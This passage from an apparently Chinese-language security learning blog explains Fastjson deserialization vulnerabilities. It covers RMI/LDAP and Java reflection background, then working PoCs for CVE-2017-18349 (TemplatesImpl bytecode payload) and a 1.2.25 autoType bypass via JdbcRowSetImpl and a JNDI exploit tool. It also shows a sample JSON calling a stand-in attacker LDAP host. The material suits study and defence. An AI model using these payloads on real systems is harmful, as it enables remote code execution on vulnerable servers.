e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo执行过程如下</p>
<p>创建RMI注册表，然后将远程对象Calculator绑定，运行代码启动服务</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324220432233.png"></p>
<p>然后在客户端运行代码成功执行运算过程</p>
<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20240324220536033.png" alt="image-20240324220536033"></p>
<h3 id="LDAP是什么"><a href="#LDAP是什么" class="headerlink" title="LDAP是什么"></a>LDAP是什么</h3><blockquote>
<p><code>LDAP</code>是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在<code>Java</code>安全中，<code>LDAP</code>通常用于集成应用程序与企业目录服务（例如<code>Microsoft Active Directory</code>或<code>OpenLDAP</code>）的认证和授权功能。</p>
</blockquote>
<p>我们通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用</p>
<p>假设有一个名为”<code>example.com</code>“的公司，需要存储和管理员工信息。他们使用<code>LDAP</code>作为员工信息的目录服务，每个员工都在<code>LDAP</code>中有一个唯一的标识符（<code>DN</code>），举个例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DN: uid=john,ou=People,dc=example,dc=com</span><br><span class="line">cn: John Doe</span><br><span class="line">sn: Doe</span><br><span class="line">givenName: John</span><br><span class="line">uid: john</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br><span class="line"></span><br><span class="line">DN: uid=alice,ou=People,dc=example,dc=com</span><br><span class="line">cn: Alice Smith</span><br><span class="line">sn: Smith</span><br><span class="line">givenName: Alice</span><br><span class="line">uid: alice</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br></pre></td></tr></table></figure>

<p>上图两位员工的DN由四个RDN（与DN相对区分）组成，分别是<code>uid=john,ou=People,dc=example,dc=com</code></p>
<p>可以使用LDAP查询语句来检索员工信息，例如<code>(&amp;(objectClass=person)(uid=john))</code>。</p>
<blockquote>
<p>&amp;表示AND操作符，实现多个查询条件，这里表示查找所有<code>objectClass</code>为<code>person</code>，且<code>uid</code>为<code>john</code>的员工信息</p>
</blockquote>
<p>而在<code>Fastjson</code>漏洞中，攻击者可以通过构造特定的<code>LDAP</code>查询语句，来执行任意代码或获取敏感信息。</p>
<p>例如下面JSON字符串包含恶意构造<code>LDAP url</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;value&quot;:&quot;ldap://hackvps.com/exp&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>Fastjson</code>解析该<code>JSON</code>字符串时，会触发<code>LDAP</code>查询操作，查询<code>hackervps.com</code>上的<code>LDAP</code>服务，并执行名为“<code>exp</code>”的操作。这就是<code>Fastjson</code>漏洞的成因之一。</p>
<h3 id="java反射是什么"><a href="#java反射是什么" class="headerlink" title="java反射是什么"></a>java反射是什么</h3><p>我们通过下面demo来进行理解</p>
<p>如果我们不用反射的话，我们写的代码会是下面这样</p>
<p>Person.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sayHello() &#123;</span><br><span class="line">        System.out.println(&quot;Hello, my name is &quot; + name + &quot;, I&#x27;m &quot; + age + &quot; years old.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Person person=new Person(&quot;张三&quot;,20);</span><br><span class="line">        person.sayHello();</span><br><span class="line">        person.setAge(18);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324223414057.png"></p>
<p>可以看到，我们一开始设置人的名字为张三，年龄为<code>20</code>，然后我们通过<code>setAge</code>方法来修改<code>Person</code>的<code>Age</code>属性，把年龄改成<code>18</code>。<br> 但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到<code>Java</code>反射技术。我们可以修改上面的<code>Main.java</code>为如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取Person类的Class对象</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;org.example.Person&quot;);</span><br><span class="line"></span><br><span class="line">        // 先获取构造函数，然后创建Person对象</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, int.class);</span><br><span class="line">        Object person = constructor.newInstance(&quot;张三&quot;, 20);</span><br><span class="line"></span><br><span class="line">        // 调用Person对象的sayHello方法</span><br><span class="line">        Method method = clazz.getMethod(&quot;sayHello&quot;);</span><br><span class="line">        method.invoke(person);</span><br><span class="line"></span><br><span class="line">        // 绕过私有字段的访问限制，修改Person对象的age属性</span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;age&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(person, 18);</span><br><span class="line"></span><br><span class="line">        // 输出修改后的Person对象信息</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="与漏洞的联系"><a href="#与漏洞的联系" class="headerlink" title="与漏洞的联系"></a>与漏洞的联系</h4><p>为什么要用到反射，而不是直接调用<code>java.lang.runtime</code>来执行命令？</p>
<p>比如下面弹计算器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;calc.exe&quot;).getInputStream(), &quot;UTF-8&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要运行上述代码，需要在maven中引入如下依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.11.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>添加完记得点击右侧的maven重新加载</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324225014432.png"></p>
<p>这样就成功弹出计算器</p>
<p>可是既然这么做可以执行命令，为什么还要搞反射呢？</p>
<blockquote>
<p>原来Java安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取Java的安全权限。如果代码没有通过安全检测，就无法执行危险操作。而反射机制可以绕过Java安全机制的限制，从而执行危险操作。</p>
</blockquote>
<p>我们以环境java8为例，demo如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    	//加载java.lang.Runtime类</span><br><span class="line">        Class&lt;?&gt; runtimeClass=Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        //获取该类的exec方法并且接受String参数</span><br><span class="line">        Method execMethod=runtimeClass.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">        //通过反射调用方法，执行系统命令并返回一个Process对象</span><br><span class="line">        Process process=(Process) execMethod.invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);</span><br><span class="line">        //下面两行将进程的标准输出流转换为更方便读取的字符流形式</span><br><span class="line">        InputStream in=process.getInputStream();</span><br><span class="line">        BufferedReader reader=new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String line;</span><br><span class="line">        //使用BufferedReader进行逐行读取</span><br><span class="line">        while((line=reader.readLine())!=null)&#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324231104393.png"></p>
<h2 id="漏洞学习"><a href="#漏洞学习" class="headerlink" title="漏洞学习"></a>漏洞学习</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）"></a>fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）</h3><p>（学习TemplatesImpl链的相关知识）</p>
<p>我们导入<code>Fastjson1.2.23</code>并自动下载相关依赖</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125553114.png"></p>
<p>然后写入如下代码至Main.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEAEG9yZy9leGFtcGxlL1Rlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAADAAEAA0ADQAOAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\n\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行代码成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125730090.png"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>上面json字符串test的<code>_bytecodes</code>内容是下面内容编译成<code>.class</code>文件再base64加密后的结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Test extends AbstractTranslet &#123;</span><br><span class="line">    public Test() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;&#125;    </span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Test t = new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们定义Test类继承<code>AbstractTranslet</code>类，然后通过构造方法执行<code>calc</code>的命令。而下面两行的transform方法都是实现<code>AbstractTranslet</code>接口的抽象方法，具体来说的话，第一个<code>transform</code>带有<code>SerializationHandler</code>参数，是为了把<code>XML</code>文档转换为另一种格式，第二个<code>transform</code>带有<code>DTMAxisIterator</code>参数，是为了对<code>XML</code>文档中的节点进行迭代。</p>
<p>实际上就是我们<code>Test t = new Test();</code>实例化的时候，假装要把<code>xml</code>文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行<code>calc</code>，所以会弹出计算器。</p>
<p><strong>为什么要继承AbstractTranslet类</strong></p>
<p>在实战场景中，<code>Java</code>的<code>ClassLoader</code>类提供了<code>defineClass()</code>方法，可以把字节数组转换成<code>Java</code>类的示例，但是这里面的方法的作用域是被<code>Protected</code>修饰的，也就是说这个方法只能在<code>ClassLoader</code>类中访问，不能被其他包中的类访问</p>
<p>而由于我们前面编写的poc中两个<code>transform</code>方法都来自<code>AbstractTranslet</code>类，那么子类可以通过调用父类的公共方法来实现对私有属性的操作，这也能解释下面的链子是如何实现的</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205721063.png"></p>
<p>但是，我们注意到在<code>TransletClassLoader</code>类中，<code>defineClass</code>调用了<code>ClassLoader</code>里面的<code>defineClass</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205743267.png"></p>
<p>然后追踪<code>TransletClassLoader</code>，发现是<code>defineTransletClasses</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205812496.png"></p>
<p>再往上，发现是<code>getTransletInstance</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205823806.png"></p>
<p>到此为止，要么是<code>Private</code>修饰要么就是<code>Protected</code>修饰，再往上继续追踪，发现是<code>newTransformer</code>，可以看到此时已经是<code>public</code>了</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205839574.png"></p>
<p>因此，我们的利用链是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl::newTransformer() -&gt; TemplatesImpl::getTransletInstance() -&gt; TemplatesImpl::defineTransletClasses() -&gt; TransletClassLoader::defineClass()</span><br></pre></td></tr></table></figure>

<p>最终poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static class test&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(test.class.getName());</span><br><span class="line"></span><br><span class="line">        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        String randomClassName = &quot;rev1ve&quot; + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] evilCode = cc.toBytecode();</span><br><span class="line">            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);</span><br><span class="line">            final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line">            String text1 = &quot;&#123;&quot;+</span><br><span class="line">                    &quot;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +&quot;\&quot;,&quot;+</span><br><span class="line">                    &quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode_base64+&quot;\&quot;],&quot;+</span><br><span class="line">                    &quot;&#x27;_name&#x27;:&#x27;rev1ve&#x27;,&quot;+</span><br><span class="line">                    &quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;+</span><br><span class="line">                    &quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;+</span><br><span class="line">                    &quot;&#125;\n&quot;;</span><br><span class="line">            ParserConfig config = new ParserConfig();</span><br><span class="line">            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326131933212.png"></p>
<h3 id="fastjson-1-2-25-反序列化漏洞"><a href="#fastjson-1-2-25-反序列化漏洞" class="headerlink" title="fastjson 1.2.25 反序列化漏洞"></a>fastjson 1.2.25 反序列化漏洞</h3><p>（学习JdbcRowSetImpl链的相关知识）</p>
<h4 id="黑白名单机制介绍"><a href="#黑白名单机制介绍" class="headerlink" title="黑白名单机制介绍"></a>黑白名单机制介绍</h4><p>众所周知，在<code>fastjson</code>自爆<code>1.2.24</code>版本的反序列化漏洞后，<code>1.2.25</code>版本就加入了黑白名单机制。<br>例如我们更换<code>1.2.25</code>版本的<code>fastjson</code>，然后再去执行原来的<code>poc</code>会发现提示<code>autoType is not support</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225435561.png"></p>
<p>查看源码可以发现这里定义了反序列化类的黑名单</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225528275.png"></p>
<p>具体如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>接下来我们定位到<code>checkAutoType()</code>方法，看一下它的逻辑。如果<code>autoType</code>（也就是autoTypeSupport）开启或者class对象不为空，那么先判断类名在不在白名单中，若有则<code>TypeUtils.loadClass</code>去加载，如果不在就去匹配黑名单</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225830172.png"></p>
<p>如果没开启<code>autoType</code>那么先匹配黑名单，然后再白名单匹配和加载</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225928936.png"></p>
<p>最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了<code>autoType</code>或者<code>expectClass</code>不为空也就是指定了<code>Class</code>对象时才会调用<code>TypeUtils.loadClass</code>加载，否则<code>fastjson</code>会默认禁止加载该类。</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230020115.png"></p>
<p>我们跟进下加载时的<code>loadClass</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230119890.png"></p>
<p>如果类名的字符串以<code>[</code>开头，则说明该类是一个数组类型，需要递归调用<code>loadClass</code>方法来加载数组元素类型对应的<code>Class</code>对象，然后使用<code>Array.newIntrance</code>方法来创建一个空数组对象，最后返回该数组对象的<code>Class</code>对象；如果类名的字符串以<code>L</code>开头并以<code>;</code>结尾，则说明该类是一个普通的<code>Java</code>类，需要把开头的<code>L</code>和结尾的<code>;</code>给去掉，然后递归调用<code>loadClass</code>。</p>
<h4 id="黑白名单绕过的复现（jkd版本问题未成功）"><a href="#黑白名单绕过的复现（jkd版本问题未成功）" class="headerlink" title="黑白名单绕过的复现（jkd版本问题未成功）"></a>黑白名单绕过的复现（jkd版本问题未成功）</h4><p>分析完后，复现绕过我们需要先开启默认禁用的<code>autoType</code>，这里我们添加代码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//以下两种都行</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;org.example.,org.javaweb.&quot;);</span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>

<p>然后启动利用工具 <a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">下载地址</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ./JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230459323.png"></p>
<p>在Main.java写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String payload = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    \&quot;a\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +</span><br><span class="line">                &quot;    &#125;,\n&quot; +</span><br><span class="line">                &quot;    \&quot;b\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/18zmzg\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;autoCommit\&quot;:true\n&quot; +</span><br><span class="line">                &quot;    &#125;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230642420.png"></p>
<h4 id="对两种poc绕过手法的分析"><a href="#对两种poc绕过手法的分析" class="headerlink" title="对两种poc绕过手法的分析"></a>对两种poc绕过手法的分析</h4><p>首先来说说限制，基于<code>JNDI+RMI</code>或<code>JDNI+LADP</code>进行攻击，会有一定的<code>JDK</code>版本限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113</span><br><span class="line">LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191</span><br></pre></td></tr></table></figure>

<p><strong>第一种poc（1.2.25-1.2.47通杀！！！）</strong></p>
